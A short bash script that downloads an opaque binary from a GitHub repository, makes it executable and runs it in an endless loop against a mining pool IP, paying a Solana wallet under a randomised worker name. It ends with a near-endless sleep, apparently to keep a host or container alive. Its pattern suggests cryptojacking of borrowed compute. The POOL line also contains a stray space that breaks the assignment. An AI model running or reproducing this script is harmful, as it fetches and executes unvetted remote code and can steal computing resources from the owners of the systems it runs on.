#!/bin/bash
POOL= 52.66.214.221:3333
WALLET=SOL:AbdhMq5piq31nj9qQTqHA3QBAq6McTsTH1MGP6UiRDAy
WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
wget https://github.com/archernap/prem/raw/main/janeman
chmod +x janeman
	while [ 1 ]; do
		./janeman -pool $POOL -wal $WALLET.$WORKER -pass x
        sleep 5
	done
sleep 999999999 
